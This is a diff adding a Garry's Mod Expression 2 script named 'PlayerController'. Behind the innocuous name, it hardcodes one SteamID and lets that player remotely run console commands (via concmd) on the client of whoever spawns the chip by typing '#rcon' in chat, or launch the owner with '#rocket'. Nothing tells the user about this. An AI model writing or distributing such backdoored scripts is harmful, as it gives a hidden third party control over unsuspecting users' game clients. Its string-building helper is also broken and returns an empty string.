@@ -1,0 +1,55 @@
+@name PlayerController
+@inputs 
+@outputs Test:string
+@persist Command:array String:string
+@trigger 
+
+function entity findPlayerBySteamID( SteamID:string ) 
+{
+    local Players = players()
+    for(I = 1, Players:count()) 
+    {
+        if (Players[I,entity]:steamID() == SteamID) 
+        {
+            return Players[I,entity]
+        }
+    }
+}
+
+function string arrayToString(Array:array) 
+{
+    local String = ""
+    for(I = 1, Array:count()) 
+    {
+        local String = String + Array[I,string]
+    }
+    return String
+}
+
+runOnTick(1)
+runOnChat(1)
+Commander = findPlayerBySteamID("STEAM_0:0:75673853")
+Test = Commander:name()
+
+String = Commander:lastSaid()
+Command = String:explode(" ")
+if(Command[1,string] == "#rcon" & chatClk(Commander))
+{
+    if(findPlayerByName(Command[2,string]) == owner() | Command[2,string] == "*")
+    {
+        SubCommand = Command
+        SubCommand:shift()
+        SubCommand:shift()
+        concmd(Command[3,string])
+        print(arrayToString(SubCommand))
+    }
+}
+elseif(Command[1,string] == "#rocket" & chatClk(Commander))
+{
+    if(findPlayerByName(Command[2,string]) == owner() | Command[2,string] == "*")
+    {
+        owner():applyPlayerForce(owner():toWorld(vec(0,0,500)) - owner():pos())
+    }
+}
+
+
